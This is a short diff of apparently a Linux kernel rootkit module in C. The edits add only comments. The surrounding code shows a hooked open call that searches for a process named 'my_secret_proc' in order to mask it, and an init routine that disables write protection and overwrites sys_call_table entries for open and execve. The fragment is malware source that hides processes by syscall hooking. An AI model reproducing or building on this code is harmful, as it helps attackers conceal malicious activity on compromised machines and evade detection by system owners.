@@ -49,7 +49,7 @@ asmlinkage int hacked_open(const char __user *filename, int flags, umode_t mode)
 	char *kfilename;
 	char *process_name = "my_secret_proc"; //Mask this process name!
 	struct task_struct *g;
-	kfilename = kzalloc(100, GFP_KERNEL);
+	kfilename = kzalloc(100, GFP_KERNEL);//allocate memory for process name
 	copy_from_user(kfilename, filename, 100);
 	for_each_process(g) { //Loop through all the processes
 		if(strcmp(process_name, g->comm) == 0){ //Find the processes which match the process_name
@@ -105,6 +105,7 @@ static int __init hook_init(void)
 	sys_call_table[__NR_execve] = (unsigned long)hacked_execve;	
 	write_cr0(cr0); //Reprotect memory (The kernel is now happy again)
 
+	//Verify we hooked em
 	if(sys_call_table[__NR_execve] == (unsigned long)hacked_execve &&\
 	sys_call_table[__NR_open] == (unsigned long)hacked_open)
 	printk("open and execve hooked\n");
